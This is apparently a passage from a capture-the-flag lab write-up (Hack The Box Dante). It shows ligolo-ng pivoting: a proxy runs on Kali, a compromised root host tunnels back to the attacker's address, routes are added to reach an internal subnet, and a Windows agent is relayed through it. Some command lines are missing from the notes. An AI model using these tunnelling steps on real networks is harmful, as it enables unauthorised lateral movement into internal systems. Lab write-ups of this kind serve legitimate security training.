I'm going to use `ligolo-ng` for the pivoting.
I need to prepare `agent` and `proxy`, and upload `agent` onto the target server.

Run proxy on kali :

```bash
┌──(kali㉿kali)-[~/htb/ligolo]
└─$ ./proxy -selfcert -laddr 0.0.0.0:443
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 405D1DD5E4C6E43F49B24A60BD8D2916F87ED4F89D4A8DBC43D74AF09D29B096 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                          
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                          
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                           
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                            
        /____/                          /____/                             
                                                                           
  Made in France ♥            by @Nicocha30!                               
  Version: 0.7.3                                                           
                                                                           
ligolo-ng » INFO[0033] Agent joined.                                 id=60ae25c3-8d6f-4d2d-b4cc-701d897ecae1 name=root@DANTE-WEB-NIX01 remote="10.10.110.100:40796"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - root@DANTE-WEB-NIX01 - 10.10.110.100:40796 - 60ae25c3-8d6f-4d2d-b4cc-701d897ecae1
[Agent : root@DANTE-WEB-NIX01] » start
[Agent : root@DANTE-WEB-NIX01] » INFO[0050] Starting tunnel to root@DANTE-WEB-NIX01 (60ae25c3-8d6f-4d2d-b4cc-701d897ecae1) 
```

Connect it from the target :

```bash
root@DANTE-WEB-NIX01:/tmp#  
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.16:443"
```

Network setting on kali :

```bash
┌──(kali㉿kali)-[~/htb/ligolo]
└─$ sudo ip tuntap add user kali mode tun ligolo
[sudo] password for kali: 


┌──(kali㉿kali)-[~/htb/ligolo]
└─$ sudo ip link set ligolo up


┌──(kali㉿kali)-[~/htb/PwnKit]
└─$ i
[sudo] password for kali: 


┌──(kali㉿kali)-[~/htb/PwnKit]
└─$ ip route
default via 192.168.45.2 dev eth0 proto dhcp src 192.168.45.131 metric 100 
10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.16 
10.10.110.0/24 via 10.10.14.1 dev tun0 
172.16.1.0/24 dev ligolo scope link 
192.168.45.0/24 dev eth0 proto kernel scope link src 192.168.45.131 metric 100 
```

Now I can send packet to `172.16.1.0/24` network.

listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

.\agent.exe -connect 172.16.1.100:11602 -ignore-cert -retry